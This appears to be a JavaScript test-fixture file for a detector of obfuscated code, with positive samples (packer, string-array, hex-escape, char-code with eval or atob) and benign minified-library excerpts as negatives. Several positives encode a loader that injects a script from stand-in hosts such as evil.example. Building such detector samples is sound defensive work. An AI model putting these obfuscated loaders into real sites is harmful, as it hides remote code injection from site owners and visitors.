/**
 * Small hand-written samples for the suspicious-code detector (gc-dcyh).
 * Positives mimic the shapes common obfuscators emit; negatives are short
 * excerpts in the style of popular minified libraries and Dawn's global.js.
 * Deliberately small: no full libraries are vendored here.
 */

// Dean Edwards packer (p,a,c,k,e,d).
export const PACKER_SAMPLE = `eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('0 1=2.3("4");1.5="6://7.8/9.a";2.b.c(1);',13,13,'var|s|document|createElement|script|src|https|cdn|example|loader|js|head|appendChild'.split('|'),0,{}))`;

// javascript-obfuscator default output shape (string array + rotate + _0x names).
export const OBFUSCATOR_SAMPLE = `var _0x4e1a=['log','Hello\\x20World','push','shift'];(function(_0x2d8f05,_0x4b81bb){var _0x4d74cb=function(_0x32719f){while(--_0x32719f){_0x2d8f05['push'](_0x2d8f05['shift']());}};_0x4d74cb(++_0x4b81bb);}(_0x4e1a,0x1b3));var _0x4d74=function(_0x2d8f05,_0x4b81bb){_0x2d8f05=_0x2d8f05-0x0;var _0x4d74cb=_0x4e1a[_0x2d8f05];return _0x4d74cb;};function _0x1f2c3a(){var _0x5a1b2c=_0x4d74('0x0');console[_0x5a1b2c](_0x4d74('0x1'));}_0x1f2c3a();`;

// String hidden as hex escapes (an injected loader URL).
export const HEX_ESCAPE_SAMPLE = `(function(){var u="\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x65\\x76\\x69\\x6c\\x2e\\x65\\x78\\x61\\x6d\\x70\\x6c\\x65\\x2f\\x6c\\x6f\\x61\\x64\\x2e\\x6a\\x73";var d=document["\\x63\\x72\\x65\\x61\\x74\\x65\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74"]("script");d.src=u;document.head.appendChild(d);})();`;

// Char-code payload executed with eval.
export const CHARCODE_EVAL_SAMPLE = `var p=String.fromCharCode(118,97,114,32,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101);eval(p+"Element('script')");`;

// Char-code payload decoded with atob (hex numeric args).
export const CHARCODE_ATOB_SAMPLE = `var k=String.fromCharCode(0x61, 0x48, 0x52);var payload=atob(k+"0cHM6Ly9leGFtcGxlLmNvbQ==");`;

// jQuery-style minified excerpt: a few legitimate \\x20 escapes in selectors.
export const JQUERY_STYLE = `/*! jQuery v3.7.1 | (c) OpenJS Foundation and other contributors | jquery.org/license */
!function(e,t){"use strict";"object"==typeof module&&"object"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error("jQuery requires a window with a document");return t(e)}:t(e)}("undefined"!=typeof window?window:this,function(ie,e){"use strict";var oe=[],r=Object.getPrototypeOf,ae=oe.slice,g=oe.flat?function(e){return oe.flat.call(e)}:function(e){return oe.concat.apply([],e)},s=oe.push,se=oe.indexOf,n={},i=n.toString,ue=n.hasOwnProperty,o=ue.toString,a=o.call(Object),le={},v=function(e){return"function"==typeof e&&"number"!=typeof e.nodeType&&"function"!=typeof e.item},y=function(e){return null!=e&&e===e.window},C=ie.document,u={type:!0,src:!0,nonce:!0,noModule:!0};var ge="[\\x20\\t\\r\\n\\f]",ve="(?:\\\\[\\da-fA-F]{1,6}"+ge+"?|\\\\[^\\r\\n\\f]|[\\w-]|[^\\0-\\x7f])+";function fe(e,t){return e.nodeName&&e.nodeName.toLowerCase()===t.toLowerCase()}var pe=new RegExp("^"+ge+"+|((?:^|[^\\\\])(?:\\\\.)*)"+ge+"+$","g");return ie.jQuery=ie.$=function(e,t){return new ie.jQuery.fn.init(e,t)},ie.jQuery});`;

// Swiper / Flickity-style minified excerpt.
export const SWIPER_STYLE = `/** Swiper 11.1.4 | MIT Licensed */
var Swiper=function(){"use strict";function e(e){return null!==e&&"object"==typeof e&&"constructor"in e&&e.constructor===Object}function t(s,a){void 0===s&&(s={}),void 0===a&&(a={}),Object.keys(a).forEach((i=>{void 0===s[i]?s[i]=a[i]:e(a[i])&&e(s[i])&&Object.keys(a[i]).length>0&&t(s[i],a[i])}))}const s={body:{},addEventListener(){},removeEventListener(){},activeElement:{blur(){},nodeName:""},querySelector:()=>null,querySelectorAll:()=>[],getElementById:()=>null,createEvent:()=>({initEvent(){}}),createElement:()=>({children:[],childNodes:[],style:{},setAttribute(){},getElementsByTagName:()=>[]})};function a(){const e="undefined"!=typeof document?document:{};return t(e,s),e}function n(e,t){return void 0===t&&(t=0),setTimeout(e,t)}function l(){return Date.now()}class Flickity{constructor(e,t){this.element=e,this.options={...t},this.cells=[],this.selectedIndex=0,this._create()}_create(){this.slider=document.createElement("div"),this.slider.className="flickity-slider",this.element.appendChild(this.slider)}}return Swiper}();`;

// Lodash-style excerpt: unicode/hex in regex sources, fromCharCode WITHOUT eval.
export const LODASH_STYLE = `/** @license Lodash <https://lodash.com/> */
;(function(){var undefined;var VERSION='4.17.21';var rsAstralRange='\\\\ud800-\\\\udfff',rsComboMarksRange='\\\\u0300-\\\\u036f',reComboHalfMarksRange='\\\\ufe20-\\\\ufe2f',rsVarRange='\\\\ufe0e\\\\ufe0f';var reHasUnicode=RegExp('[\\\\u200d'+rsAstralRange+rsComboMarksRange+reComboHalfMarksRange+rsVarRange+']');var reLatin=/[\\xc0-\\xd6\\xd8-\\xf6\\xf8-\\xff\\u0100-\\u017f]/g;var deburredLetters={'\\xc0':'A','\\xc1':'A','\\xc2':'A'};var BOM=String.fromCharCode(65279,65,66);function baseToString(value){if(typeof value=='string'){return value}return value+''}function isNull(value){return value===null}var root=typeof self=='object'&&self&&self.Object===Object&&self;root._={VERSION:VERSION,isNull:isNull,baseToString:baseToString};}.call(this));`;

// Dawn-style global.js excerpt (custom elements, fetch, no obfuscation).
export const DAWN_GLOBAL_STYLE = `function getFocusableElements(container) {
  return Array.from(
    container.querySelectorAll(
      "summary, a[href], button:enabled, [tabindex]:not([tabindex^='-']), [draggable], area, input:not([type=hidden]):enabled, select:enabled, textarea:enabled, object, iframe"
    )
  );
}

class QuantityInput extends HTMLElement {
  constructor() {
    super();
    this.input = this.querySelector('input');
    this.changeEvent = new Event('change', { bubbles: true });
    this.input.addEventListener('change', this.onInputChange.bind(this));
    this.querySelectorAll('button').forEach((button) =>
      button.addEventListener('click', this.onButtonClick.bind(this))
    );
  }

  onButtonClick(event) {
    event.preventDefault();
    const previousValue = this.input.value;
    event.target.name === 'plus' ? this.input.stepUp() : this.input.stepDown();
    if (previousValue !== this.input.value) this.input.dispatchEvent(this.changeEvent);
  }
}

customElements.define('quantity-input', QuantityInput);

function fetchConfig(type = 'json') {
  return {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Accept: \`application/\${type}\` },
  };
}
`;

// eval present but fromCharCode with variable args only (a legit decoder helper).
export const EVAL_WITHOUT_NUMERIC_CHARCODE = `function decode(codes){return String.fromCharCode.apply(null,codes)}function run(src){return window.eval(src)}`;
